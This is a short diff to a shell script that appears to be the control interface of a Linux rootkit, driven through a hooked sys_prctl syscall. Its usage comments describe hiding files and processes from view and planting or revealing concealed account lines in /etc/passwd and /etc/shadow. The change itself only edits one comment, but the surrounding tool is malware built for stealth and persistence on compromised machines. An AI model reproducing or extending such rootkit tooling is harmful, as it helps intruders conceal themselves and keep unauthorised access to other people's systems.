@@ -26,7 +26,7 @@
 #     fugitive ETC_PASSWD_LINE ETC_SHADOW_LINE -> lines in "/etc/passwd" and "/etc/shadow"
 #     hide PATH_OR_COMMAND_LINES -> hide an entity (a directory entry or ALL processes matching the command line: in that order)
 #     show PATH_OR_COMMAND_LINES -> show a hidden entity (a directory entry or ALL processes matching the command line: in that order)
-#     unfugitive ETC_PASSWD_LINE ETC_SHADOW_LINE -> show lines in "/etc/passwd" and "/etc/shadow"
+#     unfugitive -> show lines in "/etc/passwd" and "/etc/shadow"
 CALL=157 # `sys_prctl`
 [ -z "$1" ] && echo "Expected a command." >&2 && exit 1
 COMMAND="$1"
